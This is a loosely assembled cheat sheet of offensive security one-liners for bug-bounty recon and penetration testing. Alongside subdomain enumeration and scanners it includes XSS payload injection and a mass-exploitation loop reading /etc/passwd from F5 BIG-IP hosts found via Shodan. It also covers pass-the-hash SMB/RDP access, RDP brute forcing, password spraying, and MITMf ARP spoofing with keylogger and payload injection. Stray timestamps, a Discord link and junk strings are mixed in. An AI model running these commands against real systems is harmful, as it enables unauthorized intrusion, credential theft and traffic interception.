

fierce -file fierce_std_results.txt --domain somedomain.com

fierce -file fierce_brt_results.txt --subdomain-file subdomains-top1mil.txt --domain somedomain.com



Gather subdomains using OSINT:

amass enum -passive -o amass_results.txt -trf resolvers.txt -d somedomain.com


theHarvester -f theharvester_results.xml -b baidu,bevigil,bing,bingapi,certspotter,crtsh,dnsdumpster,duckduckgo,hackertarget,otx,threatminer,urlscan,yahoo -l 500 -d somedomain.com




##-============================================-##
##   [+] Extract hostnames from the results:
##-============================================-##
grep -Po '(?<=\<host\>)(?!\<(?:ip|hostname)\>)[^\s]+?(?=\<\/host\>)|(?<=\<hostname\>)[^\s]+?(?=\<\/hostname\>)' theharvester_results.xml | sort -uf | tee -a subdomains.txt


##-======================================-##
##   [+] Extract IPs from the results:
##-======================================-##
grep -Po '(?<=\<ip\>)[^\s]+?(?=\<\/ip\>)' theharvester_results.xml | sort -uf | tee -a ips.txt


##-==========================================-##
##   [+] Extract emails from the results:
##-==========================================-##
grep -Po '(?<=\<email\>)[^\s]+?(?=\<\/email\>)' theharvester_results.xml | sort -uf | tee -a emails.txt



dmitry -wines -o dmitry_results.txt somedomain.com

##-=======================================-##
##   [+] SubFinder - 
##-=======================================-##
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


##-=======================================-##
##   [+] SubFinder - 
##-=======================================-##
subfinder -d "$domain" -all -config "$HOME"/ReconPi/configs/config.yaml -o "$SUBS"/subfinder.txt


##-=======================================-##
##   [+] SubJack - 
##-=======================================-##
subjack -w "$SUBS"/hosts -a -ssl -t 50 -v -c "$HOME"/go/src/github.com/haccer/subjack/fingerprints.json -o "$SUBS"/all-takeover-checks.txt -ssl





##-===================================-##
##   [+] Nuclei - Basic Detections
##-===================================-##
nuclei -l "$SUBS"/hosts -t generic-detections/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/generic-detections.txt


##-=================================-##
##   [+] Nuclei - CVEs Detection
##-=================================-##
nuclei -l "$SUBS"/hosts -t cves/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/cve.txt


##-=====================================-##
##   [+] Nuclei - Default-Creds Check
##-=====================================-##
nuclei -l "$SUBS"/hosts -t default-credentials/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/default-creds.txt


##-===========================-##
##   [+] Nuclei - DNS Check
##-===========================-##
nuclei -l "$SUBS"/hosts -t dns/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/dns.txt


##-=============================-##
##   [+] Nuclei - Files Check
##-=============================-##
nuclei -l "$SUBS"/hosts -t files/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/files.txt


##-==============================-##
##   [+] Nuclei - Panels Check
##-==============================-##
nuclei -l "$SUBS"/hosts -t panels/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/panels.txt


##-==================================================-##
##   [+] Nuclei - Security Mis-Configuration Check
##-==================================================-##
nuclei -l "$SUBS"/hosts -t security-misconfiguration/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/security-misconfiguration.txt


##-=====================================-##
##   [+] Nuclei - Technologies Check
##-=====================================-##
nuclei -l "$SUBS"/hosts -t technologies/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/technologies.txt


##-===============================-##
##   [+] Nuclei - Tokens Check
##-===============================-##
nuclei -l "$SUBS"/hosts -t tokens/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/tokens.txt


##-======================================-##
##   [+] Nuclei - Vulnerabilties Check
##-======================================-##
nuclei -l "$SUBS"/hosts -t vulnerabilities/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/vulnerabilties.txt


##-==========================================-##
##   [+] Nuclei - Subdomain-Takeover Check
##-==========================================-##
cat "$SUBS"/hosts | nuclei -t subdomain-takeover/ -c 50 -o "$SUBS"/nuclei-takeover-checks.txt




python3 $HOME/tools/EyeWitness/Python/EyeWitness.py -f "$SUBS"/hosts --no-prompt -d "$SCREENSHOTS"
    else
        "$HOME"/go/bin/aquatone -http-timeout 10000 -out "$SCREENSHOTS" <"$SUBS"/hosts


cat "$SUBS"/alive_subdomains | naabu -p - -silent -no-probe -exclude-cdn -nmap -config "$HOME"/ReconPi/configs/naabu.conf


cat "$SUBS"/subdomains | dnsprobe -r CNAME -o "$SUBS"/subdomains_cname.txt


cat "$SUBS"/subdomains | dnsprobe -silent -f ip | sort -u | tee "$IPS"/"$domain"-ips.txt
	python3 $HOME/ReconPi/scripts/clean_ips.py "$IPS"/"$domain"-ips.txt "$IPS"/"$domain"-origin-ips.txt


waybackurls $Domain | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt


assetfinder $Domain | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'


cat "$SUBS"/hosts | sed 's/https\?:\/\///' | gau > "$ARCHIVE"/getallurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | unfurl --unique keys > "$ARCHIVE"/paramlist.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.js(\?|$)" | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u > "$ARCHIVE"/jsurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.php(\?|$) | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u " > "$ARCHIVE"/phpurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.aspx(\?|$) | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u " > "$ARCHIVE"/aspxurls.txt
cat "$ARCHIVE"/getallurls.txt  | sort -u | grep -P "\w+\.jsp(\?|$) | httpx -silent -status-code -mc 200 | awk '{print $1}' | sort -u " > "$ARCHIVE"/jspurls.txt


for js in `cat "$ARCHIVE"/jsurls.txt`;
	do
		python3 "$HOME"/tools/LinkFinder/linkfinder.py -i $js -o cli | anew "$ARCHIVE"/endpoints.txt;
	done



##-===============================================-##
##   [+] Cert.sh - Checking invalid certificate
##-===============================================-##
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx


httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne


##-=================================================================-##
##   [+] gospider - Injection xss using qsreplace to urls filter
##-=================================================================-##
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'


gobuster dir -u "$line" -w "$WORDLIST"/wordlist.txt -e -q -k -n -o "$DIRSCAN"/out.txt


##-======================================================================-##
##   [+] BufferOver.run - Subdomain Search - Resolving domain to httpx
##-======================================================================-##
curl -s "https://dns.bufferover.run/dns?q=.$Domain" |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew


##-==========================================-##
##   [+] ShuffleDNS - Resolving subdomains

cat "$SUBS"/subdomains | sort -u | shuffledns -silent -d "$domain" -r "$IPS"/resolvers.txt > "$SUBS"/alive_subdomains


##-================================-##
##   [+] Curl - 
##-================================-##
curl -vs "$url" -H"Origin: $origin" 2>&1 | grep -i "< Access-Control-Allow-Origin: $origin"
curl -vs "$url" -H"Origin: $origin" 2>&1 | grep -i "< Access-Control-Allow-Credentials: true


##-================================-##
##   [+] Sn1per - WebApp Mode:
##-================================-##
sniper -f /root/Desktop/Bounty/Airbnb/ips/valid-airbnb_ips.txt -m massweb -w airbnbtestweb




##-================================================-##
##   [+] Eyewitness - take screenshots from URLs
##-================================================-##
eyewitness -f /root/Desktop/Bounty/Client/urls.txt


##-===================================================-##
##   [+] Eyewitness - take Screenshots of all URLS
##-===================================================-##
eyewitness -f /root/Desktop/Bounty/Client/urls.txt



##-===================================================-##
##   [+] GitLeaks - 
##-===================================================-##
gitleaks --path=/directory -v --no-git


##-===================================================-##
##   [+] GitLeaks - Scan a File with Any Extension
##-===================================================-##
gitleaks --path=/file.xxx -v --no-git


Pass The Hash
rpcclient //$IP -U $domain/user%$hash --pw-nt-hash


net view Target_IP

net view 10.10.1.100


Explore it

net use < A_drive > \Target_IP\SHARE_NAME

net use K: \\10.10.1.100\Dados

pth-winexe - Pass The Hash


pht-winexe -U % //Target_IP cmd

pth-winexe -U bob%alice //172.10.1.60 cmd
Pass The Hash

pth-winexe -U bob%hash //172.16.1.60 cmd


enum4linux.pl -U 192.168.1.113 | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > Users


Using nmap smb-enum-users.nse

nmap 192.168.1.113 --script smb-enum-users.nse | grep "Full name:"



Smb Pass The Hash


pth-toolkit
Listing shared folders

sudo pth-smbclient --user= --pw-nt-hash -m smb3 -L <target_ip> \\<target_ip>\

sudo pth-smbclient --user=user --pw-nt-hash -m smb3  -L 192.168.0.24 \\\\192.168.0.24\\ ljahdçjkhadkahdkjahsdlkjahsdlkhadklad

Interactive smb shell

sudo pth-smbclient --user= --pw-nt-hash -m smb3 \\<target_ip>\shared_folder

sudo pth-smbclient --user=user --pw-nt-hash -m smb3 \\\\192.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad


xfreerdp
Simple User Enumeration for Windows Target (kerberos based)

xfreerdp /v:<target_ip> -sec-nla /u:""

xfreerdp /v:192.168.0.32 -sec-nla /u:""

login

xfreerdp /u: /g: /p: /v:<target_ip>

xfreerdp /u:administrator /g:grandbussiness /p:bla /v:192.168.1.34

Wordlist based bruteforce
NCRACK

ncrack -vv --user/-U <username/username_wordlist> --pass/-P <password/password_wordlist> <target_ip>:3389

ncrack -vv --user user -P wordlist.txt 192.168.0.32:3389

Crowbar

crowbar -b rdp <-u/-U user/user_wordlist> -c/-C <password/password_wordlist> -s <target_ip>/32 -v

crowbar -b rdp -u user -C password_wordlist -s 192.168.0.16/32 -v


Dirsearch

dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old

dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old -w path/to/wordlist

dirsearch -u https://target.com -e .

dirb

dirb http://target.com /path/to/wordlist

dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old


HostMap

hostmap.rb -only-passive -t <IP>

Thu Nov 30 03:14:47 PST 2023☆★☆
Enumeration

crackmapexec mssql $ip

Check credentials

crackmapexec mssql 192.168.56.22 -u username -p password -d domain.com
crackmapexec mssql 192.168.56.22 -u vagrant -p vagrant



Connect to mssql

python3 mssqlclient.py -windows-auth domain.com/username:Password@sqlserver.domain.com
python3 mssqlclient.py -windows-auth sa:sa@sqlserver.domain.com


nslookup -type=SRV _ldap._tcp.dc._msdcs.alux.cc

Enumerate the trusts

ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP trusts




crackmapexec smb $ip --users
net rpc group members 'Domain Users' -W 'alux.cc' -I $ip -u '%'
enum4linux -U $ip | grep 'user:'
Thu Nov 30 03:10:55 PST 2023☆★☆
Password Spraying

crackmapexec smb -u usernames.txt -p Password123!
kerbrute passwordspray --user-as-pass --dc $ip -d alux.cc users.txt
use auxiliary/scanner/smb/smb_login
crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce


Thu Nov 30 03:08:28 PST 2023☆★☆
smbmap -r -d 'domain.com' -u 'username' -p 'password' -H ip --depth (default 5)
smbmap -r -d 'domain.com' -u 'username' -p 'password' --host-file listIPs

pth-smbclient \\\\10.10.10.107\\$ -W <DOMAIN> -U <USER> -L <IP> --pw-nt-hash <HASH>

List all shares on .

pth-smbclient \\\\10.10.10.107\\<SHAR> -W <DOMAIN> -U <USER> --pw-nt-hash <HASH>


SMB Null Session

smbclient //10.10.10.X/IPC$ -W Workgroup -I 10.10.10.X -U ""


Find Hidden Servers and/or Admin Panels
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt


Subdomain Bruteforcer with FFUF
ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'


XSS 
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done


Recon using api.recon.dev
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=site.com | jg .[].domain


Get Subdomains from RapidDNS.io
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u

Get Subdomains from BufferOver.run
curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u

Get Subdomains from Riddler.io
curl -s "https://riddler.io/search/exportcsv?q=pld:domain.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

Get Subdomains from VirusTotal
curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from CertSpotter
curl -s "https://certspotter.com/api/v0/certs?domain=domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from Archive
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

Get Subdomains from JLDC
curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from securitytrails
curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u

Get Subdomains from crt.sh
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

Sort & Tested Domains from Recon.dev
curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent


curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u

curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u




assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done


shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done


gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt




##-==================================-##
##   [+] ffuf - Directory Fuzzing
##-==================================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ


##-==================================-##
##   [+] ffuf - Extension Fuzzing
##-==================================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ


##-=============================-##
##   [+] ffuf - Page Fuzzing
##-=============================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php


##-==================================-##
##   [+] ffuf - Recursive Fuzzing
##-==================================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v


##-===================================-##
##   [+] ffuf - Sub-domain Fuzzing
##-===================================-##
ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/


##-==============================-##
##   [+] ffuf - VHost Fuzzing
##-==============================-##
ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx


##-=======================================-##
##   [+] ffuf - Parameter Fuzzing - GET
##-=======================================-##
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx


##-========================================-##
##   [+] ffuf - Parameter Fuzzing - POST
##-========================================-##
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx


##-=============================-##
##   [+] ffuf - Value Fuzzing
##-=============================-##
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx








##-======================================-##
##   [+] Android - Install trusted CA:
##-======================================-##
openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1
        

cat BurpCA.pem > 9a5ba580.0
openssl x509 -inform PEM -text -in BurpCA.pem -out /dev/null >> 9a5ba580.0

adb root
abd remount

adb push 9a5ba580.0 /system/etc/security/cacerts/

adb shell “chmod 644 /system/etc/security/cacerts/9a5ba580.0”

adb shell “reboot”

Check Settings > Security > Trusted Credentials > SYSTEM 

confirm your newly added CA is listed.




APKTool - A tool for reverse engineering 3rd party, closed, binary Android apps. 
It can decode resources to nearly original form and rebuild them after making some modifications.



##-=========================-##
##    [+] Disassembling Android apk file
##-=========================-##
apktool d <apk file>
    

##-=========================-##
##    [+] Rebuilding decoded resources back to binary APK/JAR with certificate signing
##-=========================-##
apktool b <modified folder>
        

##-=========================-##
##    [+] 
##-=========================-##
keytool -genkey -v -keystore keys/test.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000


##-=========================-##
##    [+]
##-=========================-##
jarsigner -keystore keys/test.keystore dist/test.apk -sigalg SHA1withRSA -digestalg SHA1 Test








Filter by status code & Num Chars:

feroxbuster --url "[https://example.com]" --filter-status [301] --filter-size [4092]



Find links in webpage
feroxbuster --url "[https://example.com]" --extract-links



##-======================-##
##   [+] Enumerate directories without Recursion through proxy:
##-======================-##
feroxbuster --url "[https://example.com]" --wordlist [path/to/file] --no-recursion --proxy "[http://127.0.0.1:8080]"


##-======================-##

feroxbuster --url "[https://example.com]" --wordlist [path/to/file] --threads [100] --extensions "[php,txt]" --random-agent



altdns.py -i subdomainsList -o data_output -w permutationsList -r -s results_output.txt 
os.system('%s -i %s -o data_output -w %s -r -s %s' %



./enumall.py domain1.com domain2.com domain3.com -i domainlist.txt -a -p permutationslist.txt -w wordlist.com



strip=$(echo $1|sed 's/https\?:\/\///')


host $strip


masscan -p1-65535 $(dig +short $strip|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head -1) --max-rate 1000 |& tee $strip_scan




Aquatone One-liner

echo "aquatone-discover -d \$1 && 
aquatone-scan -d \$1 --ports huge && 
aquatone-takeover -d \$1 && 
aquatone-gather -d \$1" >> aqua.sh && 
chmod +x aqua.sh
./aqua.sh domain.com



apktool d app.apk; cd app;mkdir collection; 
find . -name \*.smali -exec sh -c "cp {} collection/\$(head /dev/urandom | md5 | cut -d' ' -f1).smali" \;; linkfinder -i 'collection/*.smali' -o cli



Sublist3r on a list of domains and outputs the results in separate files.

. <(cat domains | xargs -n1 -i{} python sublist3r.py -d {} -o {}.txt)




##  [+] Scanning $IPADDRESS - VLAN $VLANIDSCAN for live devices"
	

arp-scan -Q $VLANIDSCAN -I $INT $IPADDRESS -t 500 2>&1 |grep "802.1Q VLAN="

Extracting VLAN IDs on interface $INT, 
sniffing 802.1Q tagged packets for "$TAGSEC" seconds."


VLANIDS=$(tshark -a duration:$TAGSEC -i $INT $TS_FILTER_FLAG "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique)


echo "Create BBDD: ${BBDD}"

mysqladmin -u root -p${DB_PASS} create ${BBDD}

### create user
echo "Create USER: ${USERNAME}"
QUERY="CREATE USER '${USERNAME}'@'%' IDENTIFIED BY '${PASSWORD}';"
mysql -u root -p${DB_PASS} -e "$QUERY"

### create privs
echo "Create PRIVILEGES"
QUERY="GRANT ALL PRIVILEGES ON ${BBDD}.* TO '${USERNAME}'@'%' IDENTIFIED BY '${PASSWORD}' WITH GRANT OPTION MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;";
mysql -u root -p${DB_PASS} -e "$QUERY"
QUERY="GRANT ALL PRIVILEGES ON ${BBDD}.* TO '${USERNAME}'@'localhost' IDENTIFIED BY '${PASSWORD}' WITH GRANT OPTION MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;";
mysql -u root -p${DB_PASS} -e "$QUERY"

echo "Flush PRIVILEGES"
QUERY="FLUSH PRIVILEGES;"
mysql -u root -p${DB_PASS} -e "$QUERY"


sql2csv.sh

mysql -u root -p"PASSSWORD" -e "$QUERY" TABLE |sed -e "s/\


alias sqlm='sqlmap -o --batch --exclude-sysdbs --random-agent'


mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --jskeylogger

mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --javapwn --msfip 192.168.10.4

mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --filepwn

# Spoof DNS along with traditional ARP-Poisoning we would run:

python mitmf.py  --spoof --arp --iface wlan0 --gateway IP --target IP --dns --domain google.com 

mitmf.py --spoof --iface wlan0 --dhcp --shellshock

# ICMP redirect spoof
python mitmf.py --spoof --icmp --iface wlan0 --gateway IP --target IP

profile all of the clients browsers: 

sudo python mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --browserprofiler

# For ARP Spoofing we would run:
python mitmf.py --spoof --arp --iface wlan0 --gateway IP --target IP

#
#sudo python mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.

# the ArpSpoof plugin also supports poisoning by ARP-replies instead of ARP-requests: 
sudo python mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --mode rep
Sun Jan 14 13:36:22 PST 2024
https://discord.gg/https://discord.gg/28NAVxFE
Sun Jan 14 13:14:27 PST 2024
asciinema rec ~/asciinema/OSCP-$(date +"%d-%b-%Y-%T").cast
Sun Jan 14 13:11:30 PST 2024☆★☆

## Packet strings analyzer

```bash
# https://github.com/lgandx/PCredz
./Pcredz -f file-to-parse.pcap
./Pcredz -d /tmp/pcap-directory-to-parse/
./Pcredz -i eth0 -v


# Network filtering evasion
nmap --source-port 53 -p 5555 10.11.1.111
    # If work, set IPTABLES to bind this port
    iptables -t nat -A POSTROUTING -d 10.11.1.111 -p tcp -j SNAT --to :53







